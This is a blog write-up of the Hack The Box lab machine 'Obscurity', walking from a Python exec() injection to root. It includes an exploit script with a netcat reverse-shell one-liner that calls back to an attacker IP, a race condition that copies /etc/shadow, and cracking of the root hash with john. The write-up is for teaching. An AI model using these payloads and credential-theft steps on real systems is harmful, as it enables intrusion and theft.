---
layout: post
title: "HTB: Obscurity"
tags: htb
---

Obscurity was a super fun box that involved simple reversing and some understanding of cryptography. When I first did this box, I felt intimidated by the thought of having to do some reversing. But just like all (most) HTB boxes, when you persist and reach the end, you get a super rewarding (and fun!) experience.

### Recce

If you did a regular nmap scan (with `-sC -sV`), you should see open ports 22 and 8080, and some closed ports at 80 and 9000. Immediately you should see that port 8080 is the more interesting one - simply cos it's got more results from the nmap scan.

### Port 8080

Visit port 8080 and you see a web-page talking about "0bscura", and some text along the page that I personally felt was sarcasm towards the the concept of "security through obscurity". 

All fun and good, but if you scroll to the bottom, you should see some juicy information:

<img src="https://raw.githubusercontent.com/ongyuann/ongyuann.github.io/master/images/2020-05-29-obscura-detail.png" alt="say what?" class="inline"/>  

So now we've got a filename `SuperSecureServer.py`, stored in a `secret development directory`, in a message that's addressed to `server devs`.

We don't know what entails a `secret development directory` (which could've helped us locate the file on the website), but we do have the file name, `SuperSecureServer.py`. So let's work with that.

To find the file we want on the site, we can use the 'extensions' option available on most dirbusting programs to search for paths ending in `/SuperSecureServer.py` - after all, when searching for specific extensions / filetypes, the dirbusting program is simply adding a suffix to the path that it's examining, so in the same vein, we turn that suffix into `/SuperSecureServer.py` to find the file we want.

On most dirbusting programs, the 'extensions' option is usually invoked with `-e` or `-X`. With `dirb`, it's invoked with `-X`, and though slow, the good thing about using `dirb` is that it automatically forces your defined extensions on every entry of the wordlist it's using (other busters like `gobuster` and `dirsearch` requires you to have to 'force' it).

So we do that with the `/usr/share/wordlist/dirb/common.txt` wordlist, and immediately we find a sensible result:
```console
dirb http://obscurity.htb:8080 ./common.txt -o initial.txt -X /SuperSecureServer.py
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: initial.txt
START_TIME: Fri Apr 17 23:39:52 2020
URL_BASE: http://obscurity.htb:8080/
WORDLIST_FILES: ./common.txt
EXTENSIONS_LIST: (/SuperSecureServer.py) | (/SuperSecureServer.py) [NUM = 1]

-----------------

GENERATED WORDS: 4616                                                          

---- Scanning URL: http://obscurity.htb:8080/ ----
+ http://obscurity.htb:8080/develop/SuperSecureServer.py (CODE:200|SIZE:5892) 
```

We find a file at `/develop/SuperSecureServer.py`.

### Reversing `SuperSecureServer.py` for RCE

At `http://obscurity.htb:8080/develop/SuperSecureServer.py`, you see a Python program that looks like it's the very source code on which the server on port 8080 runs on.

If at this point you wish there was an alternative to understanding the Python code in order to get a foothold on the box, you're out of luck.

Let's take a look at the code:
```python
kali@kali:~$ cat SuperSecureServer.py 
import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}


class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)                                                                                                               
        now = datetime.now()                                                                                                                       
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")                                                                      
    def stringResponse(self):                                                                                                                      
        return respTemplate.format(**self.__dict__)                                                                                                
                                                                                                                                                   
class Request:                                                                                                                                     
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


class Server:
    def __init__(self, host, port):    
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}
```

No need to panic yet, as always the most interesting places to look in a source code are 'informative' comments and dangerous functions. As it were, both of them are present:

'Informative' comments:
```
# This is how you do string formatting, right?
```

Dangerous functions:
```
exec(info.format(path))
```

So the clues we have are that the author probably didn't implement string formatting correctly on Python, and if we could exploit the improperly-implemented string formatting, we can pass our commands to the `exec` function which can execute system commands, essentially allowing us remote code execution capabilities.

Let's study how we can exploit the supposedly poorly-formatted string formatting. To do this, we can make our own Python script where we imitate the way that user input is received into `SuperSecureServer.py` by using the same `urllib.parse` function that `SuperSecureServer.py` is using, then parsing that input in the exact same way. (FYI, note that the user input in this case is the URL that is entered into `SuperSecureServer.py`).
```python
kali@kali:~$ cat test.py 
#!/usr/bin/python3

import sys
import urllib.parse
import os

path = sys.argv[1]
path = urllib.parse.unquote(path)
info = "output = 'Document: {}'"

print ('[+] exec (info.format(path))')
print ('[+] print')
print (info.format(path)) #instead of exec, do print to visualize
print ('[+] exec')
exec (info.format(path)) #original exec statement
```

First 3 lines: Import the same libraries that `SuperSecureServer.py` imports - conveniently for us, `os` and `sys` are also imported! (Great for command execution!)

Next 3 lines: Simulate entry of user input into the program. Note that `info` contains the prepared statement that we will have to try to escape via poorly-implemented string formatting.

Last few lines: Visualizes how our input is parsed by the prepared statement. In the last line, our input is parsed into the original `exec` statement.

With this setup, let's do a few tests:
```console
kali@kali:~$ ./test.py wow
[+] exec (info.format(path))
[+] print
output = 'Document: wow'
[+] exec
```
Entering `wow` does no harm, but we do see how our input is inserted into the prepared statement. We should notice that if we had inserted a `'` before `wow`, we could close the prepared statement and potentially insert our own commands, just like how all injections typically work.

```console
kali@kali:~$ ./test.py "%40"
[+] exec (info.format(path))
[+] print
output = 'Document: @'
[+] exec
```
Entering `%40`, we see that our input is URL-decoded into `@`. This is caused by the `urllib.parse` function, which automatically URL-decodes user input. Why did we have to test this? That's because most command injections via web-applications rely on bypassing restrictions through URL encoding/decoding, so now that we've confirmed this transformation in the source code, maybe we can use this to our advantage (and ultimately, we do!). 

```console
kali@kali:~$ ./test.py "wow';print (%27a%27)"
[+] exec (info.format(path))
[+] print
output = 'Document: wow';print ('a')'
[+] exec
Traceback (most recent call last):
  File "./test.py", line 16, in <module>
    exec (info.format(path))
  File "<string>", line 1
    output = 'Document: wow';print ('a')'
                                        ^
SyntaxError: EOL while scanning string literal
```
Here we've attempted a mini command injection by entering `wow';print (%27a%27)`. URL decoded, this becomes `wow';print ('a')` - see here that we've immediately capitalized on URL encoding to smuggle `'` characters into the user input, where such characters could have broken the statement prematurely (actually it doesn't, but still good practice ˙ ͜ʟ˙).

However, we see that there's a `SyntaxError` caused by a mistake I'd made here - I'd forgotten to take care if the trailing `'` at the end of the prepared statement. So in our next try, let's take care of it by adding another `'` at the end of our input to pair up with the trailing `'` and close the loop. Note that to add this `'`, we need to first add a `;` before to close our injected command -> `;'`.

```console
kali@kali:~$ ./test.py "wow';print (%27a%27);'"
[+] exec (info.format(path))
[+] print
output = 'Document: wow';print ('a');''
[+] exec
a
```
Notice the `a` below the `[+] exec`. We've successfully demonstrated command injection! Note here that we now have the syntax for our command injection: `"wow';<our-url-encoded-command>;'"`

To get a shell back this way, we can automate this by Python - and if we use Python's `requests` module, we can take advantage of the fact that the `requests` module automatically URL-encodes inputs! Super convenient!
```python
kali@kali:~$ cat shell-trigger.py 
import requests

cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.64 4444 >/tmp/f'
payload = "wow';os.system ('"+cmd+"');'"
url = 'http://obscurity.htb:8080/'

r = requests.get(url+payload)
print (r.text) #for debugging
```
Notice that our `cmd` payload is: `"wow';os.system ('"+cmd+"');'"`, where we use the `os.system` function to execute our reverse-shell command. Told ya it was useful that the `SuperSecureServer.py` imports `os`!

### Shell as www-data

Replace the IP address and port in our `shell-trigger.py` with your own, open up a listening netcat, and run the file. You should get a shell back:
```
kali@kali:~$ python shell-trigger.py 
```
```
kali@kali:~/htb/boxes/obscurity/dirb$ sudo nc -lvnp 4444
[sudo] password for kali: 
listening on [any] 4444 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.168] 40980
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
  
If you look around, you'll find `robert`'s home directory, where there's a `user.txt` that you can't read.
```
$ pwd
/home/robert
$ ls -l
total 24
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
$ cat user.txt
cat: user.txt: Permission denied
```

### Priv: www-data -> robert
To move forward, we need to utilize what we can read in `robert`'s home directory. Immediately we see that we can read everything inside except `user.txt`. Let's take a look at the files we can read.

```
$ cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct!
```
```
$ cat out.txt
¦ÚÈêÚÞØÛÝÝ×ÐÊßÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐêÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäèÎÍÚÎëÑÓäáÛÌ×v
```
```
$ cat passwordreminder.txt
´ÑÈÌÉàÙÁÑé¯·¿k
```

And not really last but definitely not least,
```
$ cat SuperSecureCrypt.py
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```
For now, trust me because I've done the box, we can leave `BetterSSH` for later. 
  
Looking at what we've seen from `check.txt` and `out.txt`, we can reasonably deduce that `out.txt` is the encrypted output of `check.txt`. What we want is to be able to decrypt `passwordreminder.txt`, since that definitely looks like it can help us login as `robert`.
  
Let's start with analyzing `SuperSecureCrypt.py`. Immediately, we should recognize that there's no point trying to defeat the stuff at the bottom - we could, but that would take this box to an insane level, which it isn't. Let's look at the main functions in the code, which is always a good practice when reversing a program.
  
For our purposes, the main functions are `encrypt` and `decrypt`. We see that both functions take in two inputs: `(text, key)`, and return one output, which is either `encrypted` or `decrypted`.
```
def encrypt(text, key):
    (..snip..)
    return encrypted

def decrypt(text, key):
    (..snip..)
    return decrypted
```
This tells us that if we have the `key`, we can easily decode `passwordreminder.txt` and possibly get `robert`'s credentials. So how to get the `key`?
  
Well for starters, let's hope that the cryptography in here is very simple - the same `text` with the same `key` will always return the same `output`. If this is the case, that means if we have the `input` and the `output`, we can reliably retrieve the `key`. It's kind of like:
```
let 'a' = text, 'b' = key, 'c' = output
let '+' = encryption, '-' = decryption

if a + b = c,
and c - b = a,
then c - a = b
```
In words:  
If `text` encrypted with `key` = `encrypted`,
and `encrypted` decrypted with `key` = `text`,
then `encrypted` decrypted with `decrypted` = `key`.

We have our `text` (`check.txt`), and we have our `encrypted` (`out.txt`) - we can absolutely do this. But before we do it, let's take another wee look at the program's arguments (i.e. how it accepts input):
```
parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')
```
Quickly,
- `-i` is where we put the *filename* that contains our `text`,
- `-o` is where we put the filename that contains our output (whether `encrypted` or `decrypted`),
- `-k` is where we put the *string* that represents our `key`,
- `-d` activates 'Decrypt mode' - this is crucial! We need to *decrypt* to get our `key`.
  
Now let's put this in action:
```
kali@kali:~$ python3 SuperSecureCrypt.py -d -i out.txt -o key.txt -k "Encrypting this file with your key should result in out.txt, make sure your key is correct!"
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to key.txt...
kali@kali:~$ cat key.txt 
alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich
```
We got it! `alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich`
  
Now we can decrypt `passwordreminder.txt`:
```
kali@kali:~$ python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o test.txt -k "alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovich"
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to test.txt...
kali@kali:~$ cat test.txt 
SecThruObsFTW
```
And now we have `robert`'s password: `SecThruObsFTW`!

Login as robert:
```
sshpass -p "SecThruObsFTW" ssh robert@obscurity.htb
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

(..snip..)


Last login: Mon Dec  2 10:23:36 2019 from 10.10.14.4
robert@obscure:~$ 
```
Grab user.txt here.

### Priv: robert -> root

Getting root from here on involves another round of reversing and some devious bash techniques. Don't be disheartened! We're nearly there.

Now remember we left out `BetterSSH` earlier? It now becomes relevant. Because if we do a `sudo -l`...
```
robert@obscure:~$ sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
...we see that `robert` can do a restricted `sudo` with python3 to run `BetterSSH.py`. Obviously this is the intended way to do the box, so let's look inside `BetterSSH.py`.
  
(If you're tired of reversing by now, have heart! We're nearly there!)
```
robert@obscure:~/BetterSSH$ cat BetterSSH.py 
import sys
import random, string
import os
import time
import crypt
import traceback
import subprocess

path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
session = {"user": "", "authenticated": 0}
try:
    session['user'] = input("Enter username: ")
    passW = input("Enter password: ")

    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
    passwords = []
    for x in data:
        if not x == None:
            passwords.append(x)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
    while True:
        command = input(session['user'] + "@Obscure$ ")
        cmd = ['sudo', '-u',  session['user']]
        cmd.extend(command.split(" "))
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        o,e = proc.communicate()
        print('Output: ' + o.decode('ascii'))
        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```

Reading the code, immediately we can disregard the complicated parts, and really look for weird behaviours wired into the program. And if you did look into that, you should immediately notice this _really_ weird behaviour:
```
    with open('/etc/shadow', 'r') as f:
        data = f.readlines()
    data = [(p.split(":") if "$" in p else None) for p in data]
(..snip..)

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
```
Incredibly, as part of its authentication process `BetterSSH.py` temporarily stores a copy of `/etc/shadow` in the `/tmp/SSH/` folder! Of course, it then deletes the copy once the authentication process is completed.
  
Although it looks like we could delay the authentication process long enough so that we could open another SSH session to look into `/tmp/SSH`, it looks like we don't have such an opportunity:
```
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: a
```
In another SSH session:
```
robert@obscure:~$ ls -l /tmp
total 12
prw-r--r-- 1 www-data www-data    0 May 29 09:23 f
drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44ab9325446a69ce3f7d-systemd-resolved.service-6oqTnP
drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44ab9325446a69ce3f7d-systemd-timesyncd.service-eNWleg
-rw-rw-r-- 1 robert   robert      0 May 29 10:18 test.txt
drwx------ 2 root     root     4096 May 29 06:30 vmware-root_622-2689275054
```

We see no hint of a `/SSH` folder in `/tmp`. And if we complete the authentication process, we see that the program outputs an error indicating that it failed to locate `/tmp/SSH`. 
```
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: a
Enter password: a
Traceback (most recent call last):
  File "/home/robert/BetterSSH/BetterSSH.py", line 24, in <module>
    with open('/tmp/SSH/'+path, 'w') as f:
FileNotFoundError: [Errno 2] No such file or directory: '/tmp/SSH/pl1LOkRs'
```
To fix that, let's create a `/tmp/SSH` folder ourselves.
```
robert@obscure:~$ mkdir /tmp/SSH
robert@obscure:~$ ls -l /tmp/SSH
total 0
```

Now if we run the program and enter invalid credentials, we see that the program works properly:
```
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: a
Enter password: a
Invalid user
```
But still, if we tried to delay the authentication process (e.g. by entering only username), we can't see anything in the `/tmp/SSH` folder with our second terminal (you can try). 

However if we looked at the timestamp of the `/tmp/SSH` folder, we can verify that the `/tmp/SSH` folder is 'touched' when `BetterSSH.py` is run:
```
robert@obscure:~$ ls -l /tmp
total 16
prw-r--r-- 1 www-data www-data    0 May 29 09:23 f
drwxrwxr-x 2 robert   robert   4096 May 29 10:46 SSH
drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44ab9325446a69ce3f7d-systemd-resolved.service-6oqTnP
drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44ab9325446a69ce3f7d-systemd-timesyncd.service-eNWleg
-rw-rw-r-- 1 robert   robert      0 May 29 10:18 test.txt
drwx------ 2 root     root     4096 May 29 06:30 vmware-root_622-2689275054
```
Check: `10:46`. Run the program:
```
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: a
Enter password: a
Invalid user
```
Check:
```
robert@obscure:~$ ls -l /tmp
total 16
prw-r--r-- 1 www-data www-data    0 May 29 09:23 f
drwxrwxr-x 2 robert   robert   4096 May 29 10:53 SSH
drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44ab9325446a69ce3f7d-systemd-resolved.service-6oqTnP
drwx------ 3 root     root     4096 May 29 06:30 systemd-private-c11b72588eae44ab9325446a69ce3f7d-systemd-timesyncd.service-eNWleg
-rw-rw-r-- 1 robert   robert      0 May 29 10:18 test.txt
drwx------ 2 root     root     4096 May 29 06:30 vmware-root_622-2689275054
```
Check: `10:53`. We can confirm that `/tmp/SSH` was 'touched' by `BetterSSH.py`.

So what we now have here is a race with `BetterSSH.py`: we need to grab the copy of `/etc/shadow` created in `/tmp/SSH` before `BetterSSH.py` deletes it.

Can we do that? Absolutely! 

First, let's create a perpetual loop that would constantly copy everything from `/tmp/SSH/` to a convenient directory of our choosing, say `/home/robert/net`. (Because this loop is the `net` that will catch our `fish' ;))
```
robert@obscure:~$ mkdir net
robert@obscure:~$ ls -l
total 28
drwxr-xr-x 2 root   root   4096 Dec  2 09:47 BetterSSH
-rw-rw-r-- 1 robert robert   94 Sep 26  2019 check.txt
drwxrwxr-x 2 robert robert 4096 May 29 10:58 net
-rw-rw-r-- 1 robert robert  185 Oct  4  2019 out.txt
-rw-rw-r-- 1 robert robert   27 Oct  4  2019 passwordreminder.txt
-rwxrwxr-x 1 robert robert 2514 Oct  4  2019 SuperSecureCrypt.py
-rwx------ 1 robert robert   33 Sep 25  2019 user.txt
robert@obscure:~$ while true;do cp -r /tmp/SSH /home/robert/net;done &
[1] 28190
```
Note: The `&` at the end of the command turns it into a background process. `[1] 28190` is the `pid` of our backgrounded command.

Second, we run `BetterSSH.py`:
```
robert@obscure:~/BetterSSH$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: a
Enter password: a
Invalid user
```
(Yes, you don't even need to enter correct credentials!)

Third, let's check our 'net':
```
robert@obscure:~$ ls -l net
total 4
drwxrwxr-x 2 robert robert 4096 May 29 11:05 SSH
robert@obscure:~$ ls -l net/SSH/
total 4
-rw-r--r-- 1 robert robert 249 May 29 11:05 pCtQ32Jo
```
Ka-boom! We caught the fish!
  
Let's cut up the fish and look inside:
```
robert@obscure:~$ cat net/SSH/pCtQ32Jo 
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7

robert
$6$fZZcDG7g$lfO35GcjUmNs3PSjroqNGZjH35gN4KjhHbQxvWO0XU.TCIHgavst7Lj8wLF/xQ21jYW5nD66aJsvQSP/y1zbH/
18163
0
99999
7
```

Let's take root's hash and crack it with `john` - but to do that, we first need to format the hash. Replace the newlines with ':' and add three more ':' at the end, like this:
```
root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:18226:0:99999:7:::
```
(You can take a look at your own `/etc/shadow` file to see how this string is formatted.)
  
Grab the `/etc/passwd` counterpart:
```
robert@obscure:~$ head /etc/passwd
root:x:0:0:root:/root:/bin/bash
```

Now `unshadow` the thing so that `john` can read it:
```
kali@kali:~$ sudo unshadow passwd shadow > hash
```
(Note the sequence: `passwd`, then `shadow`)

`john` the hash (Note: I've already set `john` to automatically use the `rockyou.txt` that comes with kali)
```
kali@kali:~$ cat hash 
root:$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:0:0:root:/root:/bin/bash
kali@kali:~$ sudo john hash
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 2 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 6 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 11 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 7 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 5 candidates buffered for the current salt, minimum 16 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 2 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/wordlists/rockyou.txt, rules:Wordlist
mercedes         (root)
```

Now that we have `root`'s password, we can `su` to `root`:
```
robert@obscure:~$ su - root
Password: 
root@obscure:~#
```

Hope you enjoyed the process as much as I did :). Much thanks to @clubby789 for making this box!
